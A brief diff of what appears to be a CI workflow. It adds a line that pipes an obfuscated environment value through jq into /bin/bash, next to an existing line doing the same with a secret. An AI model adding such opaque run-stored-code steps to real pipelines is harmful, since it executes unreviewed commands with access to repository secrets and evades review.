@@ -17,6 +17,7 @@ jobs:
           hh8134: ${{ secrets.hh8134 }}
         run: |
           printf '%s' "$hh8134" | jq -r .tpxu0435 | /bin/bash
+          echo $t50485 | jq -r .lewk04 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
